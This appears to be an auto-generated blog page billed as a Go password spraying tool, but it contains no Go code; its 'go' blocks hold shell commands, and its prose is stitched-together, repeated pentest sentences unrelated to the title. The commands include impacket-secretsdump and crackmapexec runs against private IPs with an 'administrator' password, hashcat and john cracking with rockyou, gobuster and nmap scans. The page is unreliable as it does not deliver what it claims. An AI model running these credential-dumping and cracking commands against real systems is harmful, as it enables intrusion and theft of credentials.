---
TitleSEO: "Password Spraying Tool in Go | ZureFX"
TitlePost: "Password Spraying Tool — Go"
Author: "ZureFX"
Description: "A Go script for password spraying tool. Built for security research and automation."
Keywords: "scanner, bash, script, automation, go, python"
URL: "https://zurefx.github.io/scripting/script-password-spraying-tool-141.html"
URL_IMAGES: ""
Date: "2025-09-06"
Tags: "Scanner, Bash, Script, Automation, Go, Python"
Section: "scripting"
Lang: "en"
main_img: "script-password-spraying-tool-141"
Permalink: "/scripting/script-password-spraying-tool-141.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

Weak file permissions allowed modification of critical system files. Unconstrained delegation was enabled on the compromised machine. Authentication bypass was achieved through careful manipulation of the login mechanism.

Built with **Go** for offensive security automation.

### Requirements

- Go
- `GetUserSPNs`
- `smbexec`
- `pwncat`

## Implementation

### Core Logic

The database credentials were hardcoded in the application source code. Post-exploitation enumeration revealed a path to domain administrator privileges.

```go
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
crackmapexec smb 10.40.206.205 -u administrator -p 'P@ssw0rd!' --shares
```

The scheduled task ran with elevated privileges and could be abused for escalation. Initial enumeration revealed several interesting open ports on the target.

### Helper Functions

The target system was identified as running a vulnerable version of the service. The backup files contained sensitive information that should not have been accessible.

```go
crackmapexec smb 10.69.242.151 -u administrator -p 'P@ssw0rd!' --shares
crackmapexec smb 10.35.44.13 -u administrator -p 'P@ssw0rd!' --shares
```

## Usage

### Basic Usage

Lateral movement was facilitated by reusing discovered credentials across services. Privilege escalation was possible due to misconfigured sudo permissions.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.42.17.240
```

### Advanced Options

Post-exploitation enumeration revealed a path to domain administrator privileges. Unconstrained delegation was enabled on the compromised machine. The backup files contained sensitive information that should not have been accessible.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
gobuster dir -u http://10.123.72.103/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
nmap -sCV -p80,5986,587 10.108.202.124 -oN scan.txt
```

## Output

### Example Output

Network traffic analysis revealed unencrypted communications containing user credentials. Weak file permissions allowed modification of critical system files.

```
[+] Scanning target...
[+] Found 4 results
[+] Done in 18.55s
```
